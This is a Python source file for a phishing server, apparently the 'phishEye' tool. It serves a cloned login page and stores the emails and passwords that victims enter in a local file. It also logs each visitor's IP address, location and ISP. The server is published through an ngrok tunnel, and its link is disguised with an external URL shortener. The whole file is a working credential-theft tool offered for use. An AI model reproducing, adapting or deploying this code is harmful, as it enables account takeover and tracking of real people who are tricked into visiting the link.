try:
    # importing Flask and other modules
    from flask import Flask, request, render_template, redirect
    from waitress import serve
    import os, socket, os.path, argparse, requests
    from banner import *

    os.system("cls" if os.name == "nt" else "clear")
    PrintBanner()

    def is_connected():
        try:
            # connect to the host -- tells us if the host is actually
            # reachable
            socket.create_connection(("1.1.1.1", 53))
            return True
        except OSError:
            pass
        return False

    # Flask constructor
    app = Flask(__name__)

    @app.errorhandler(404)

    # inbuilt function which takes error as parameter
    def not_found(e):
        return redirect("https://www.google.com")

    # A decorator used to tell the application
    # which URL is associated function
    victim_list = []

    @app.route("/login", methods=["POST"])
    def submit():
        if request.method == "POST":
            # getting input with name = fname in HTML form
            email = request.form.get("email")
            # getting input with name = lname in HTML form
            password = request.form.get("pass")
            if os.path.exists("captured.db"):
                f = open("captured.db", "a")
                f.write(
                    site.replace("https://www.", "")
                    + "|  ID : "
                    + email
                    + "  "
                    + " |   Password: "
                    + password
                    + "\n-------------------------------------------------------------------------------------------------------\n"
                )
                f.close()
            else:
                f = open("captured.db", "w")
                f.write(
                    site.replace("https://www.", "")
                    + "|  ID : "
                    + email
                    + "  "
                    + " |   Password: "
                    + password
                    + "\n-------------------------------------------------------------------------------------------------------\n"
                )
                f.close()
            print(
                f" [ * ] Victim {len(victim_list)} account id:",
                email,
                "password:",
                password,
            )
            print(" [ + ] saved in captured.db")
            print("\n [ * ] Waiting for other victim to open the link...")
            return redirect(site)

        return render_template("index.html")

    @app.route("/", methods=["GET", "POST"])
    def victimInfo():
        if request.method == "POST":
            victim_data = request.json
            if victim_data["status"] == "fail":
                print(" [ - ] An error occurred when retrieving victim data :-(")
            else:
                victim_list.append(victim_data["ip"])
                print("\n [ * ] An victim found !")
                print(f" [ + ] Victim {len(victim_list)} IP: " + victim_data["ip"])
                print(
                    f" [ + ] Victim {len(victim_list)} user-agent: "
                    + victim_data["useragent"]
                )
                print(
                    f" [ + ] Victim {len(victim_list)} continent: "
                    + victim_data["continent_code"]
                )
                print(
                    f" [ + ] Victim {len(victim_list)} country: "
                    + victim_data["country_name"]
                )
                print(
                    f" [ + ] Victim {len(victim_list)} region: "
                    + victim_data["region"]
                )
                print(f" [ + ] Victim {len(victim_list)} city: " + victim_data["city"])
                print(
                    f" [ + ] Victim {len(victim_list)} zip code: "
                    + victim_data["postal"]
                )
                print(
                    f" [ + ] Victim {len(victim_list)} latitude and longitude:",
                    victim_data["longitude"],
                    ",",
                    victim_data["latitude"],
                )
                print(f" [ + ] Victim {len(victim_list)} ISP: " + victim_data["org"])
                print(f"\n [ * ] Waiting for credentials...")
        return render_template("index.html")

    def is_connected():
        try:
            host = socket.gethostbyname("1.1.1.1")
            s = socket.create_connection((host, 80), 2)
            s.close()
            return True
        except:
            pass
        return False

    def short(url, alias):
        try:
            reqUrl = "https://yb.gd/short"

            headersList = {
                "Content-Type": "application/json",
                "Content-Type": "application/json",
            }

            payload = '{"longURL":"' + url + '"}'

            response = requests.request(
                "POST", reqUrl, data=payload, headers=headersList
            )

            r = response.text.split('":"')[1].replace('"', "").replace("}", "")
            print(
                " [ * ] Phishing short link: "
                + alias
                + "@"
                + r.replace("\n", "").replace("https://", "")
            )
        except:
            if is_connected():
                print(
                    " [ ! ] Short url error!!!\n [ ! ] Please make an issue on github (https://github.com/sky9262/phishEye)"
                )
            else:
                print("You don't have internet connection for short url!!!")

    def start_ngrok(port):
        from pyngrok import ngrok

        url = ngrok.connect(port, bind_tls=True).public_url
        print(" [ * ] Ngrok public address: ", url)
        short(url, site)
        print("\n============================ Ready To Go ============================")
        print("\n [ * ] Waiting victim to open the link...")

    if __name__ == "__main__":
        parser = argparse.ArgumentParser()

        parser.add_argument("-p", "--port", default=4444, help="Port number")

        args = parser.parse_args()

        PORT = args.port
        global site
        with open("./server/templates/index.html") as f:
            first_line = f.readline()
        site = first_line.replace("<!-- ", "").replace(" -->", "").replace("\n", "")

        app.debug = False
        print(" [ * ] Phishiing to:", site)
        print(
            " [ * ] Local address:",
            "http://" + socket.gethostbyname(socket.gethostname()) + ":" + PORT,
        )
        ngrok = start_ngrok(PORT)
        serve(app, host="0.0.0.0", port=PORT, _quiet=True)

except KeyboardInterrupt:
    pass
